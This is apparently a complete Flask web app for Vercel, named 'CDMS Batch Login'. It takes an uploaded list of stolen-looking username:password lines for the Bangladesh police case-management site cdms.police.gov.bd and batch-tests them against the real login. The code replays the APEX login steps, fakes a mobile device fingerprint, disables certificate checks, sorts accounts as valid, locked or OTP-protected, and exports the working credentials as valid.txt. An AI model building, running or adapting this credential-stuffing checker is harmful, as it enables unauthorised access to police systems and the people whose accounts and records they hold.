#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
CDMS Batch Login — Vercel (single file)
"""
import os, re, json, time, html as html_mod
from flask import Flask, request, jsonify, Response

import requests
try:
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except Exception:
    pass

app = Flask(__name__)

# ============================================================================
#  CONFIG
# ============================================================================
MATCH_PREFIXES = [
    "https://cdms.police.gov.bd/cdms/f",
    "http://cdms.police.gov.bd/cdms/f",
    "cdms.police.gov.bd/cdms/f",
]
BASE_ORIGIN = "https://cdms.police.gov.bd"
BASE_PATH   = "/cdms"
LOGIN_URL   = f"{BASE_ORIGIN}{BASE_PATH}/f?p=105:LOGIN"

UA = ("Mozilla/5.0 (Linux; Android 15; V2507A Build/AP3A.240905.015.A2_V000L1) "
      "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/153.0.8010.36 Mobile Safari/537.36")

CONNECT_TO = 15
REQUEST_TO = 40
MAX_CHUNK  = 5   # Vercel 60s limit — keep this small


# ============================================================================
#  UTILS
# ============================================================================
def find_input_value(doc, attr, val, numeric=False):
    pat = r'(\d+)' if numeric else r'([^"]*)'
    m = re.search(rf'{attr}="{re.escape(val)}"[^>]*?\bvalue="{pat}"', doc)
    if m: return m.group(1)
    m = re.search(rf'\bvalue="{pat}"[^>]*?{attr}="{re.escape(val)}"', doc)
    if m: return m.group(1)
    return None


def is_cdms_line(line):
    low = line.strip().lower()
    if not low or low.startswith("#"): return False
    return any(low.startswith(p.lower()) for p in MATCH_PREFIXES)


def parse_account_line(line):
    line = line.strip()
    if not line or line.startswith("#"): return None
    parts = line.split(":")
    if len(parts) < 3: return None
    pw, user = parts[-1], parts[-2]
    if not user or not pw: return None
    return user, pw


# ============================================================================
#  CdmsSession — 5-step APEX login
# ============================================================================
class CdmsSession:
    def __init__(self):
        self.s = requests.Session()
        self.s.headers.update({
            "Connection": "keep-alive", "User-Agent": UA,
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "en-US,en;q=0.9",
        })
        self.instance = self.salt = self.protected = ""
        self.pageSubmission = self.otpPlugin = self.voutPlugin = ""
        self.otpFlag = "N"
        self.finalHtml = ""

    def close(self):
        try: self.s.close()
        except Exception: pass

    def step1(self):
        r = self.s.get(LOGIN_URL, headers={
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-User": "?1",
            "Sec-Fetch-Dest": "document",
        }, allow_redirects=True, timeout=(CONNECT_TO, REQUEST_TO), verify=False)

        doc = r.text
        v = find_input_value(doc, "name", "p_instance", numeric=True)
        if v: self.instance = v
        else:
            m = re.search(r'f\?p=\d+:[^:]+:(\d+)', r.url)
            if m: self.instance = m.group(1)
        if not self.instance: raise RuntimeError("no p_instance")

        v = find_input_value(doc, "name", "p_page_submission_id")
        if v: self.pageSubmission = html_mod.unescape(v)
        v = find_input_value(doc, "id", "pSalt")
        if v: self.salt = html_mod.unescape(v)
        v = find_input_value(doc, "id", "pPageItemsProtected")
        if v: self.protected = html_mod.unescape(v)
        if not self.salt: raise RuntimeError("no salt")

        ids = [i.replace("\\u002F", "/").replace("\\/", "/")
               for i in re.findall(r'ajaxIdentifier":"([^"]+)"', doc)]
        for i in ids:
            if not self.otpPlugin and "REEgVFlQRX5-MzY3NTQxMjk3MTkyMzQ4Mjk2Nw" in i: self.otpPlugin = i
            if not self.voutPlugin and "REEgVFlQRX5-NDk2NTc1ODE5MDIzNDA1ODg2NA" in i: self.voutPlugin = i
        if not self.otpPlugin and len(ids) > 1: self.otpPlugin = ids[1]
        if not self.voutPlugin and len(ids) > 2: self.voutPlugin = ids[2]
        if not self.otpPlugin or not self.voutPlugin: raise RuntimeError("no ajax plugins")

    def _ajax(self, plugin, username):
        payload = {"pageItems": {
            "itemsToSubmit": [{"n": "P101_USERNAME", "v": username}],
            "protected": self.protected, "rowVersion": "", "formRegionChecksums": [],
        }, "salt": self.salt}
        data = {
            "p_flow_id": "105", "p_flow_step_id": "101",
            "p_instance": self.instance, "p_debug": "",
            "p_request": f"PLUGIN={plugin}",
            "p_json": json.dumps(payload, separators=(",", ":")),
        }
        return self.s.post(
            f"{BASE_ORIGIN}{BASE_PATH}/wwv_flow.ajax?p_context=105:101:{self.instance}",
            data=data, headers={
                "X-Requested-With": "XMLHttpRequest",
                "Accept": "application/json, text/javascript, */*; q=0.01",
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "Origin": BASE_ORIGIN, "Referer": LOGIN_URL,
                "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Dest": "empty",
            }, timeout=(CONNECT_TO, REQUEST_TO), verify=False)

    def step2(self): return self._ajax(self.voutPlugin, "")

    def step3(self, username):
        r = self._ajax(self.otpPlugin, username)
        m = re.search(r'"id"\s*:\s*"P101_OTP_FLAG"\s*,\s*"value"\s*:\s*"([^"]+)"', r.text)
        if m: self.otpFlag = m.group(1)
        return r

    def step4(self, username): return self._ajax(self.voutPlugin, username)

    def step5(self, username, password):
        items = [
            {"n": "P0_IP", "v": "0.0.0.0"}, {"n": "P0_G_IP", "v": "0.0.0.0"},
            {"n": "P0_CURR_URL", "v": "CDMS"},
            {"n": "P101_USERNAME", "v": username},
            {"n": "P101_TOTAL_LOGIN_USER", "v": ""},
            {"n": "P101_PASSWORD", "v": password},
            {"n": "P101_CLINT_IP", "v": ""}, {"n": "P101_OTP", "v": ""},
            {"n": "P101_OTP_FLAG", "v": self.otpFlag},
            {"n": "P101_PLATFORM", "v": "Android"},
            {"n": "P101_PLATFORM_VERSION", "v": ""}, {"n": "P101_ARCHITECTURE", "v": ""},
            {"n": "P101_MODEL", "v": ""}, {"n": "P101_BROWSER_VERSION", "v": ""},
            {"n": "P101_USER_AGENT", "v": UA}, {"n": "P101_SCREEN_SIZE", "v": "361 x 801"},
            {"n": "P101_PIXEL_RATIO", "v": "3.5"}, {"n": "P101_COLOR_DEPTH", "v": "24"},
            {"n": "P101_CPU_CORES", "v": "8"}, {"n": "P101_RAM_GB", "v": "8"},
            {"n": "P101_TOUCH_POINTS", "v": "5"}, {"n": "P101_TIMEZONE", "v": "Asia/Dhaka"},
            {"n": "P101_WEBGL_VENDOR", "v": "ARM"},
            {"n": "P101_WEBGL_RENDERER", "v": "Mali-G925-Immortalis MC12"},
        ]
        payload = {"salt": self.salt, "pageItems": {
            "itemsToSubmit": items, "protected": self.protected,
            "rowVersion": "", "formRegionChecksums": [],
        }}
        data = {
            "p_json": json.dumps(payload, separators=(",", ":")),
            "p_flow_id": "105", "p_flow_step_id": "101",
            "p_instance": self.instance,
            "p_page_submission_id": self.pageSubmission,
            "p_request": "P101_LOGIN", "p_reload_on_submit": "A",
        }
        r = self.s.post(
            f"{BASE_ORIGIN}{BASE_PATH}/wwv_flow.accept?p_context=105:101:{self.instance}",
            data=data, headers={
                "Cache-Control": "max-age=0",
                "Content-Type": "application/x-www-form-urlencoded",
                "Origin": BASE_ORIGIN, "Upgrade-Insecure-Requests": "1",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Referer": LOGIN_URL,
                "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document",
            }, timeout=(CONNECT_TO, REQUEST_TO), verify=False, allow_redirects=True)
        self.finalHtml = r.text
        return r


def classify(final_html):
    doc = final_html
    if ("স্থায়ীভাবে বন্ধ" in doc or "permanently" in doc.lower()
            or "account locked" in doc.lower()):
        return "locked", "account permanently locked"
    m = re.search(r'htmldbStdErr[^>]*>\s*([^<]+?)\s*<', doc)
    if m:
        msg = html_mod.unescape(m.group(1)).strip()
        low = msg.lower()
        if "otp" in low or "ওটিপি" in msg: return "otp", msg
        return "failed", msg
    m = re.search(r'aErrMsgTitle[^>]*>\s*([^<]+?)\s*<', doc)
    if m: return "failed", html_mod.unescape(m.group(1)).strip()
    m = re.search(r'APP_PAGE_ID:\s*"(\d+)"', doc)
    if m and m.group(1) != "101": return "valid", f"page {m.group(1)}"
    m = re.search(r'APP_USER:\s*"([^"]+)"', doc)
    if m and m.group(1).lower() != "nobody" and m.group(1) != "":
        return "valid", f"user={m.group(1)}"
    return "failed", "unknown response"


def try_login(username, password):
    s = CdmsSession()
    try:
        s.step1(); s.step2(); s.step3(username); s.step4(username)
        s.step5(username, password)
        return classify(s.finalHtml)
    finally:
        s.close()


# ============================================================================
#  FLASK ROUTES
# ============================================================================
@app.route("/")
def index():
    return Response(INDEX_HTML, mimetype="text/html; charset=utf-8")


@app.route("/health")
def health():
    return jsonify({"ok": True, "service": "cdms-batch", "time": time.time()})


@app.route("/process-chunk", methods=["POST"])
def process_chunk():
    data = request.get_json(silent=True)
    if not data:
        return jsonify({"error": "invalid JSON body"}), 400

    lines = data.get("lines", [])
    start_index = int(data.get("start_index", 0))

    if not isinstance(lines, list):
        return jsonify({"error": "lines must be a list"}), 400
    if len(lines) > MAX_CHUNK:
        lines = lines[:MAX_CHUNK]

    results = []
    valid   = []

    for i, line in enumerate(lines):
        idx = start_index + i
        sline = (line or "").strip()

        if not is_cdms_line(sline):
            results.append({"index": idx, "status": "skip",
                            "account": sline[:60] or "(blank)",
                            "msg": "non-CDMS account"})
            continue

        parsed = parse_account_line(sline)
        if not parsed:
            results.append({"index": idx, "status": "skip",
                            "account": sline[:60], "msg": "invalid format"})
            continue

        username, password = parsed
        try:
            status, msg = try_login(username, password)
        except Exception as e:
            status, msg = "error", str(e)[:150]

        results.append({"index": idx, "status": status,
                        "account": username, "msg": msg})
        if status == "valid":
            valid.append(f"{BASE_ORIGIN}{BASE_PATH}/f:{username}:{password}")

    return jsonify({"results": results, "valid": valid, "processed": len(lines)})


# ============================================================================
#  INDEX HTML (embedded)
# ============================================================================
INDEX_HTML = r"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>CDMS Batch Login</title>
<style>
:root{--bg:#0f1220;--card:#171a2e;--line:#2a2f52;--txt:#e6e8f0;--mut:#9aa1c2;
      --ok:#22c55e;--err:#ef4444;--warn:#f59e0b;--acc:#4f7cff;--vio:#a78bfa;--gray:#64748b;}
*{box-sizing:border-box}
body{margin:0;font:14px/1.5 system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;
     background:var(--bg);color:var(--txt);padding:16px 12px 40px;}
.wrap{max-width:900px;margin:0 auto;}
h1{font-size:20px;margin:0 0 4px;}
.sub{color:var(--mut);font-size:12.5px;margin-bottom:14px;}
.card{background:var(--card);border:1px solid var(--line);border-radius:10px;padding:16px;margin-bottom:14px;}
input[type=file]{width:100%;padding:10px;background:#0b0e16;border:1px dashed var(--line);
                 border-radius:8px;color:var(--txt);font-size:13px;}
.btn{margin-top:10px;padding:10px 18px;background:var(--acc);color:#fff;border:0;
     border-radius:8px;font-size:13.5px;font-weight:600;cursor:pointer;margin-right:8px;}
.btn:hover{filter:brightness(1.1);}
.btn:disabled{opacity:.5;cursor:not-allowed;}
.btn.dl{background:var(--ok);}
.btn.stop{background:var(--err);}
.btn.resume{background:var(--warn);color:#2b1a00;}
.btn.reset{background:transparent;color:var(--mut);border:1px solid var(--line);}
.banner{padding:12px 15px;border-radius:10px;font-size:13px;margin-bottom:14px;
        border:1px solid var(--line);background:#1a1d33;}
.banner b{display:block;margin-bottom:3px;font-size:14px;}
.banner.run{border-color:var(--acc);background:rgba(79,124,255,.08);}
.banner.pause{border-color:var(--warn);background:rgba(245,158,11,.08);}
.banner.done{border-color:var(--ok);background:rgba(34,197,94,.08);}
.banner.ready{border-color:var(--gray);background:rgba(100,116,139,.08);}
.row{display:grid;grid-template-columns:repeat(auto-fit,minmax(95px,1fr));gap:8px;margin-bottom:14px;}
.stat{background:var(--card);border:1px solid var(--line);border-radius:10px;padding:11px 8px;text-align:center;}
.stat .n{font-size:19px;font-weight:700;}
.stat .l{font-size:10px;text-transform:uppercase;letter-spacing:.5px;color:var(--mut);margin-top:3px;}
.stat.ok .n{color:var(--ok);}.stat.err .n{color:var(--err);}
.stat.warn .n{color:var(--warn);}.stat.vio .n{color:var(--vio);}.stat.gray .n{color:var(--gray);}
.bar{height:8px;background:#0b0e16;border:1px solid var(--line);border-radius:6px;
     overflow:hidden;margin:6px 0 12px;}
.bar .fill{height:100%;background:var(--acc);transition:width .3s;}
#logs{background:#080a12;border:1px solid var(--line);border-radius:10px;padding:10px;
      max-height:440px;overflow-y:auto;font-family:ui-monospace,Consolas,monospace;
      font-size:11.5px;line-height:1.55;white-space:pre-wrap;word-break:break-word;}
.ln{padding:2px 0;}
.ln.valid{color:#4ee0b3;}.ln.failed{color:#fca5a5;}
.ln.locked{color:#fbbf24;}.ln.otp{color:#c4b5fd;}
.ln.error{color:#f87171;}.ln.skip{color:#94a3b8;}
code{background:#0b0e16;padding:1px 5px;border-radius:4px;color:#a5b4fc;font-size:12px;}
.hint{font-size:11.5px;color:var(--mut);margin-top:8px;}
</style>
</head>
<body>
<div class="wrap">
    <h1>🛡️ CDMS Batch Login</h1>
    <div class="sub">Vercel edition · Only <code>https://cdms.police.gov.bd/cdms/f</code> lines are processed.</div>

    <div id="banner" class="banner ready"><b>📤 Upload account.txt</b>Select a file and press Upload & Start.</div>

    <div class="card">
        <input type="file" id="file" accept=".txt">
        <button class="btn" id="btn-upload" onclick="uploadAndStart()">⬆ Upload & Start</button>
        <button class="btn reset" onclick="resetAll()">🗑 Reset</button>
    </div>

    <div class="card">
        <button class="btn resume" id="btn-resume" style="display:none;" onclick="resumeJob()">▶ Resume</button>
        <button class="btn stop" id="btn-stop" style="display:none;" onclick="stopJob()">■ Stop</button>
        <button class="btn dl" id="btn-dl" style="display:none;" onclick="downloadValid()">⬇ Download valid.txt</button>
    </div>

    <div class="row">
        <div class="stat">      <div class="n" id="s_total">0</div><div class="l">CDMS Total</div></div>
        <div class="stat gray"> <div class="n" id="s_skip">0</div><div class="l">Skipped</div></div>
        <div class="stat">      <div class="n" id="s_proc">0</div><div class="l">Processed</div></div>
        <div class="stat ok">   <div class="n" id="s_valid">0</div><div class="l">Valid</div></div>
        <div class="stat err">  <div class="n" id="s_fail">0</div><div class="l">Failed</div></div>
        <div class="stat warn"> <div class="n" id="s_lock">0</div><div class="l">Locked</div></div>
        <div class="stat vio">  <div class="n" id="s_otp">0</div><div class="l">OTP</div></div>
    </div>

    <div class="bar"><div class="fill" id="prog" style="width:0%"></div></div>
    <div class="sub" id="lineinfo" style="margin-bottom:8px;"></div>
    <div id="logs"></div>
</div>

<script>
const CHUNK_SIZE = 5;
const LS_KEY     = 'cdms_vercel_v1';

let allLines      = [];
let cdmsIndexes   = [];
let cursor        = 0;
let validAccounts = [];
let stats         = { total:0, skipped:0, processed:0, valid:0, failed:0, locked:0, otp:0 };
let running       = false;
let currentFileHash = '';

function $(id){return document.getElementById(id);}
function sleep(ms){return new Promise(r=>setTimeout(r,ms));}

function hashString(str) {
    let h = 5381;
    for (let i = 0; i < str.length; i++) h = ((h << 5) + h + str.charCodeAt(i)) | 0;
    return (h >>> 0).toString(16);
}

function isCdms(line) {
    const s = (line||'').trim().toLowerCase();
    if (!s || s.startsWith('#')) return false;
    return s.startsWith('https://cdms.police.gov.bd/cdms/f') ||
           s.startsWith('http://cdms.police.gov.bd/cdms/f') ||
           s.startsWith('cdms.police.gov.bd/cdms/f');
}

function saveProgress() {
    try {
        localStorage.setItem(LS_KEY, JSON.stringify({
            cursor, stats, validAccounts,
            total: cdmsIndexes.length,
            fileHash: currentFileHash,
        }));
    } catch(e){}
}

function loadProgress() {
    try {
        const s = localStorage.getItem(LS_KEY);
        return s ? JSON.parse(s) : null;
    } catch(e) { return null; }
}

function clearProgress() { localStorage.removeItem(LS_KEY); }

function setBanner(kind, title, sub) {
    const b = $('banner');
    b.className = 'banner ' + kind;
    b.innerHTML = '<b>' + title + '</b>' + (sub ? '<span style="color:var(--mut)">' + sub + '</span>' : '');
}

function updateStats() {
    $('s_total').textContent = stats.total;
    $('s_skip').textContent  = stats.skipped;
    $('s_proc').textContent  = stats.processed;
    $('s_valid').textContent = stats.valid;
    $('s_fail').textContent  = stats.failed;
    $('s_lock').textContent  = stats.locked;
    $('s_otp').textContent   = stats.otp;
    const pct = stats.total > 0 ? Math.min(100, (cursor / stats.total) * 100) : 0;
    $('prog').style.width = pct + '%';
    $('lineinfo').textContent = 'CDMS accounts: ' + cursor + ' / ' + stats.total +
                                 '  (' + pct.toFixed(1) + '%)';
    $('btn-dl').style.display = validAccounts.length > 0 ? 'inline-block' : 'none';
}

function addLog(res) {
    const d = document.createElement('div');
    d.className = 'ln ' + res.status;
    const t = new Date().toLocaleTimeString();
    d.textContent = '[' + t + '] #' + res.index + '  ' + res.account +
                    '  →  ' + res.status.toUpperCase() + '  (' + res.msg + ')';
    const logsEl = $('logs');
    const stick = logsEl.scrollTop + logsEl.clientHeight >= logsEl.scrollHeight - 40;
    logsEl.appendChild(d);
    if (stick) logsEl.scrollTop = logsEl.scrollHeight;
}

async function uploadAndStart() {
    const f = $('file').files[0];
    if (!f) { alert('Select account.txt first'); return; }

    const text = await f.text();
    allLines = text.split(/\r?\n/);
    currentFileHash = hashString(text);

    cdmsIndexes = [];
    for (let i = 0; i < allLines.length; i++) {
        if (isCdms(allLines[i])) cdmsIndexes.push(i);
    }

    if (cdmsIndexes.length === 0) {
        alert('No CDMS lines found. Each line must start with https://cdms.police.gov.bd/cdms/f');
        return;
    }

    const saved = loadProgress();
    if (saved && saved.fileHash === currentFileHash && saved.cursor > 0 && saved.cursor < cdmsIndexes.length) {
        cursor = saved.cursor;
        stats  = saved.stats  || stats;
        validAccounts = saved.validAccounts || [];
        setBanner('pause', '⏸ Resumed', 'Continuing from CDMS account #' + cursor + ' / ' + cdmsIndexes.length);
        $('btn-resume').style.display = 'none';
    } else {
        cursor = 0;
        validAccounts = [];
        stats = { total: cdmsIndexes.length, skipped: 0, processed: 0,
                  valid: 0, failed: 0, locked: 0, otp: 0 };
        clearProgress();
    }

    $('logs').innerHTML = '';
    updateStats();
    $('btn-upload').disabled = true;
    $('btn-stop').style.display = 'inline-block';
    $('btn-resume').style.display = 'none';

    await runLoop();
}

async function resumeJob() {
    $('btn-resume').style.display = 'none';
    $('btn-stop').style.display = 'inline-block';
    await runLoop();
}

async function runLoop() {
    running = true;

    while (running && cursor < cdmsIndexes.length) {
        const chunkLines = [];
        const chunkStart = cursor;
        for (let i = cursor; i < Math.min(cursor + CHUNK_SIZE, cdmsIndexes.length); i++) {
            chunkLines.push(allLines[cdmsIndexes[i]]);
        }
        if (chunkLines.length === 0) break;

        let resp;
        try {
            const r = await fetch('/process-chunk', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ lines: chunkLines, start_index: chunkStart }),
            });
            resp = await r.json();
        } catch (e) {
            setBanner('pause', '⚠ Network error', String(e) + ' — press Resume to retry');
            $('btn-resume').style.display = 'inline-block';
            $('btn-stop').style.display = 'none';
            running = false;
            saveProgress();
            return;
        }

        if (resp.error) {
            alert('Server error: ' + resp.error);
            running = false;
            return;
        }

        for (const res of resp.results) {
            stats.processed++;
            if      (res.status === 'valid')  stats.valid++;
            else if (res.status === 'locked') stats.locked++;
            else if (res.status === 'otp')    stats.otp++;
            else if (res.status === 'skip')   stats.skipped++;
            else                              stats.failed++;
            addLog(res);
        }
        validAccounts.push(...(resp.valid || []));
        cursor += chunkLines.length;

        updateStats();
        saveProgress();
        await sleep(150);
    }

    if (cursor >= cdmsIndexes.length) {
        running = false;
        setBanner('done', '✅ Finished',
            'All ' + cdmsIndexes.length + ' CDMS accounts checked. ' +
            validAccounts.length + ' valid.');
        $('btn-stop').style.display = 'none';
        $('btn-resume').style.display = 'none';
        $('btn-upload').disabled = false;
    }
}

function stopJob() {
    running = false;
    $('btn-stop').style.display = 'none';
    if (cursor < cdmsIndexes.length) {
        setBanner('pause', '⏸ Stopped',
            'Stopped at CDMS account #' + cursor + ' / ' + cdmsIndexes.length + '. Press Resume to continue.');
        $('btn-resume').style.display = 'inline-block';
    }
    saveProgress();
}

function downloadValid() {
    const txt = validAccounts.join('\n');
    const blob = new Blob([txt], {type: 'text/plain'});
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url; a.download = 'valid.txt';
    document.body.appendChild(a); a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
}

function resetAll() {
    if (!confirm('Clear all progress and valid list?')) return;
    clearProgress();
    location.reload();
}

(function init() {
    const saved = loadProgress();
    if (saved && saved.cursor > 0 && saved.cursor < saved.total) {
        setBanner('pause', '⏸ Previous session found',
            'Upload the SAME account.txt and press Upload & Start to resume.');
    }
})();
</script>
</body>
</html>
"""

# Vercel detection
application = app
handler = app
